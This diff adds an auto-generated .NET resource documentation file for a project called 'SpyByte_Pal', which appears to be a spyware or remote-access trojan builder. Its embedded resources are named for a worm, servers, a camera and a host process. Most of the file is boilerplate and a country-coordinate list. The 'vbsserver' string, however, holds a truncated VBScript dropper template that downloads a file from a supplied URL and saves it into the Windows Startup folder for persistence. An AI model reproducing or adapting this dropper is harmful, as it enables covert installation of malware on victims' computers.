@@ -1,0 +1,141 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+SpyByte_Pal
+</name>
+</assembly>
+<members>
+<member name="P:SpyByte_Pal.My.Resources.Resources.ResourceManager">
+	<summary>
+  Returns the cached ResourceManager instance used by this class.
+</summary>
+</member><member name="P:SpyByte_Pal.My.Resources.Resources.Culture">
+	<summary>
+  Overrides the current thread's CurrentUICulture property for all
+  resource lookups using this strongly typed resource class.
+</summary>
+</member><member name="P:SpyByte_Pal.My.Resources.Resources.Armi">
+	<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member><member name="P:SpyByte_Pal.My.Resources.Resources.back">
+	<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member><member name="P:SpyByte_Pal.My.Resources.Resources.Cam">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:SpyByte_Pal.My.Resources.Resources.countryinfo">
+	<summary>
+  Looks up a localized string similar to 
+
+Afghanistan|33.00,65.00
+
+Akrotiri|34.37,32.58
+
+Albania|41.00,20.00
+
+Algeria|28.00,3.00
+
+American Samoa|-14.20,-170.00
+
+Andorra|42.30,1.30
+
+Angola|-12.30,18.30
+
+Anguilla|18.15,-63.10
+
+Antarctica|-90.00,0.00
+
+Antigua and Barbuda|17.03,-61.48
+
+Arctic Ocean|90.00,0.00
+
+Argentina|-34.00,-64.00
+
+Armenia|40.00,45.00
+
+Aruba|12.30,-69.58
+
+Ashmore and Cartier Islands|-12.14,123.05
+
+Atlantic Ocean|0.00,-25.00
+
+Australia|-27.00,133.00
+
+Austria|47.20,13.20
+
+Azerbaijan|40.30,47.30
+ [rest of string was truncated]";.
+</summary>
+</member><member name="P:SpyByte_Pal.My.Resources.Resources.Icons_Land_Vista_Hardware_Devices_Home_Server">
+	<summary>
+  Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
+</summary>
+</member><member name="P:SpyByte_Pal.My.Resources.Resources.notify">
+	<summary>
+  Looks up a localized resource of type System.IO.UnmanagedMemoryStream similar to System.IO.MemoryStream.
+</summary>
+</member><member name="P:SpyByte_Pal.My.Resources.Resources.saher_blue_eagle">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:SpyByte_Pal.My.Resources.Resources.Server_New_">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:SpyByte_Pal.My.Resources.Resources.Server_nodll_">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:SpyByte_Pal.My.Resources.Resources.SpyByte_Pal_Worm_">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:SpyByte_Pal.My.Resources.Resources.SpyByte_Server_">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:SpyByte_Pal.My.Resources.Resources.ss">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:SpyByte_Pal.My.Resources.Resources.ss2">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:SpyByte_Pal.My.Resources.Resources.txhost">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:SpyByte_Pal.My.Resources.Resources.vbs">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:SpyByte_Pal.My.Resources.Resources.vbsserver">
+	<summary>
+  Looks up a localized string similar to fileurl =%url%
+filename =%name%
+dim shellobj 
+set shellobj = wscript.createobject("wscript.shell")
+strlink = fileurl
+strPath = shellobj.SpecialFolders("Startup")  
+strPath = strPath  &amp; "\Startup"
+strsaveto = strPath &amp; filename
+set objhttpdownload = createobject("msxml2.xmlhttp" )
+objhttpdownload.open "get", strlink, false
+objhttpdownload.send
+set objfsodownload = createobject ("scripting.filesystemobject")
+if  objfsodownload.fileexists (strsaveto) then
+    objfsodownload.deletefile (strsaveto)
+ [rest of string was truncated]";.
+</summary>
+</member><member name="T:SpyByte_Pal.My.Resources.Resources">
+	<summary>
+  A strongly-typed resource class, for looking up localized strings, etc.
+</summary>
+</member>
+</members>
+</doc>
